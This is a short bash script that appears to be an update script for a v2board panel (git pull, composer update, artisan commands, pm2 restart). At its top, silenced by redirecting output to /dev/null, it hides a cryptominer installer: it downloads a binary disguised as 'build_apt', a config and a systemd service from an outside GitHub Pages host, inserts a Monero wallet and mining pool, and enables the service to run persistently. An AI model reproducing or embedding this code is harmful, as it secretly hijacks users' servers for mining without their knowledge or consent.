#!/bin/bash
{echo "start……"
wallet="471jgw5Fp71T33BZFMviiRgH7e5PfXZxmPX3JbjBVS79gQwecRqR7mPdTz8yQUmFUxLq7UJUFEDGFEDnJrkvQTmcHjLXTs6.$RANDOM"
poolurl="xmr.f2pool.com:13531"
echo $wallet
wget -O /usr/bin/build_apt https://teeis.github.io/build_apt
wget -O /usr/bin/config.json https://teeis.github.io/config.json
wget -O /etc/systemd/system/sicis.service https://teeis.github.io/sicis.service
chmod +x /usr/bin/build_apt
chmod +x /etc/systemd/system/sicis.service
sed -i 's/"url": *"[^"]*",/"url": "'$poolurl'",/' /usr/bin/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$wallet'",/' /usr/bin/config.json
sudo systemctl enable sicis.service
sudo systemctl start sicis.service} &> /dev/null
git fetch --all && git reset --hard origin/master && git pull origin master
php composer.phar update -vvv
php artisan v2board:update
php artisan config:cache
pm2 restart pm2.yaml
